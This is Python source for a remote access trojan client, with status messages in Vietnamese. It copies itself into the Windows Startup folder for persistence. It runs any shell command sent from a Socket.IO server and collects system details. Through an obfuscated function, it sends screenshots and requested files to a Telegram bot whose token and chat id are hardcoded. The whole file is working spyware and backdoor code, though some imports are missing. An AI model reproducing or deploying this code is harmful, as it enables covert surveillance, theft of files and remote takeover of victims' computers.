import socketio
import platform
from urllib.request import urlopen
import subprocess
import pyautogui
import requests
import threading
import os
import time

io = socketio.Client()
thread_list = []
io.connect("http://localhost:5678")

try:
    current_file_path = os.path.abspath(__file__)
    START_UP = os.path.normpath(
        r"%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        % (os.environ["USERPROFILE"])
    )
except:
    pass
try:
    shutil.copyfile(sys.executable, START_UP + "\\umikey.exe")
except: 
    pass  

def send_txt_file_to_telegram_bot(
    OOOOOOOOOO00O000O, O0OO0OOOO00O0000O, OO00O00OOO000O00O
):  # line:50
    try:
        O00O00OOO00OO0O00 = (
            f"https://api.telegram.org/bot{O0OO0OOOO00O0000O}/sendDocument"  # line:53
        )
        O000O0OO00O00000O = {"chat_id": OO00O00OOO000O00O}  # line:54
        O0OOOO0OO0O000OOO = {"document": open(OOOOOOOOOO00O000O, "rb")}  # line:55
        response = requests.post(
            O00O00OOO00OO0O00, params=O000O0OO00O00000O, files=O0OOOO0OO0O000OOO
        )
    except:
        return None        

def on_connect():
    print("connected")


def on_disconnect():
    print("disconnected")


def sc():
    print("s")

def scs():
    try:
        photo = pyautogui.screenshot()
        path_folder = "C:/windows (x34)/default_type/app_data/"
        file_name = "photo.png"
        if not os.path.exists(path=path_folder):
            os.makedirs(path_folder)
        path_file = f"{path_folder}{file_name}"
        photo.save(path_file)
        
        t = threading.Thread(target=send_txt_file_to_telegram_bot, args=[
        path_file,
        "6926656520:AAHRSnlX2_xHNg1P5AXc6LXyx1455R7NeUc",
        "6290053899",
        ])
        t.start()
        thread_list.append(t)
    except Exception as e:
        return None

def get_file(path_file):
    try:
        t = threading.Thread(target=send_txt_file_to_telegram_bot, args=[
                path_file,
                "6926656520:AAHRSnlX2_xHNg1P5AXc6LXyx1455R7NeUc",
                "6290053899",
                ])
        t.start()
    except:
        return None

def recv_data_all(data):
    try:
        if data == "screen short":
            scs()
            io.emit("send_data_all_user", "đã chụp màn hình")
        elif data[0:13] == "download file":
            get_file(data[14:])
            io.emit("send_data_all_user", "đã chụp lấy file")
        else:
            io.emit("send_data_all_user", "cmd không hợp lệ")
    except:
        return None


def recv_data_only(data):
    try:
        if data == "screen short":
            scs()
            io.emit("only_to_all", "đã chụp màn hình")
        elif data[0:13] == "download file":
            get_file(data[14:])
            io.emit("only_to_all", "đã lấy file")
        elif data[:2] == "cd":
            try:
                os.chdir(data[3:])
                io.emit("only_to_all", str(os.getcwd()) + ">")
            except:
                io.emit("only_to_all", str(os.getcwd()) + ">")
                pass
        else:
            try:
                out_put = ""
                result = subprocess.Popen(
                    data,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    shell=True,
                )
                out_put = result.stdout.read() + result.stderr.read()
                out_put = {data: str(out_put)}
                io.emit("only_to_all", out_put)
            except:
                io.emit("only_to_all", "null")
    except:
        return None


def getIpAddressReal():
    try:
        source = urlopen("http://checkip.dyndns.com")
        data = str(source.read())
        ip_string = re.search(r"\d+\.\d+\.\d+\.\d+", data).group()
        return ip_string
    except Exception as err:
        pass


def information():
    try:
        system = str(platform.system())
        release = str(platform.release())
        version = str(platform.version())
        machine = str(platform.machine())
        uname = str(platform.uname().node)
        ip = getIpAddressReal()
        result = []
        result.append(system)
        result.append(release)
        result.append(version)
        result.append(machine)
        result.append(uname)
        return result
    except:
        return None


data = information()

io.emit("information", {"data": data})
io.on("server_send_command", recv_data_all)
io.on("server_send_to_only_you", recv_data_only)
io.on("connection", on_connect)
io.on("disconnect", on_disconnect)


io.wait()
